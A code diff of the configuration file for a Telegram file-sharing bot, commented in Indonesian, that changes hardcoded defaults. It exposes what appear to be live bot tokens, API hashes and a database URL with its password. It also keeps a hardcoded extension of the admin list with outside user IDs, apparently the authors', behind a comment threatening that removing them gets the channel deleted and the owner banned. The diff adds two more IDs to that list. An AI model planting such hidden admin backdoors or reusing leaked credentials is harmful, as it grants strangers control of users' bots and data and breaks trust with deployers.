@@ -11,19 +11,19 @@ from logging.handlers import RotatingFileHandler
 load_dotenv("config.env")
 
 # Bot token dari @Botfather
-TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6751177416:AAFZrr9dnQIAGw39BGkFG2gXdlZ57xIvbvU")
+TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "6691135349:AAEOw0QR-IDSVEoGfB7nZzIwGIbV_23vIQQ")
 
 # API ID Anda dari my.telegram.org
-APP_ID = int(os.environ.get("APP_ID", "20913084"))
+APP_ID = int(os.environ.get("APP_ID", "27223027"))
 
 # API Hash Anda dari my.telegram.org
-API_HASH = os.environ.get("API_HASH", "67eb42c8167df3ebe8935e961e3349e5")
+API_HASH = os.environ.get("API_HASH", "468263153be169687a24b59cd70a944c")
 
 # ID Channel Database
-CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1002017567460"))
+CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001948604396"))
 
 # NAMA OWNER
-OWNER = os.environ.get("OWNER", "1228099043")
+OWNER = os.environ.get("OWNER", "5950326801")
 
 # Protect Content
 PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "True"))
@@ -39,8 +39,8 @@ UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
 DB_URI = os.environ.get("DATABASE_URL", "postgres://eqohmhvo:FEuqCRF3vicdSfN6ELBmzH7JTGMwvWv4@rain.db.elephantsql.com/eqohmhvo")
 
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
-FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1002002557188"))
-FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "-1002126223505"))
+FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "-1001802772798"))
+FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "-1002004744029"))
 
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
@@ -50,7 +50,7 @@ START_MSG = os.environ.get(
     "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
 )
 try:
-    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "1228099043").split())]
+    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "5950326801").split())]
 except ValueError:
     raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
 
@@ -68,7 +68,7 @@ DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "Tru
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((844432220, 1250450587, 1750080384, 182990552, 1748872441, 542434322))
+ADMINS.extend((844432220, 1250450587, 1750080384, 182990552, 1748872441, 5950326801, 1228099043))
 
 
 LOG_FILE_NAME = "logs.txt"
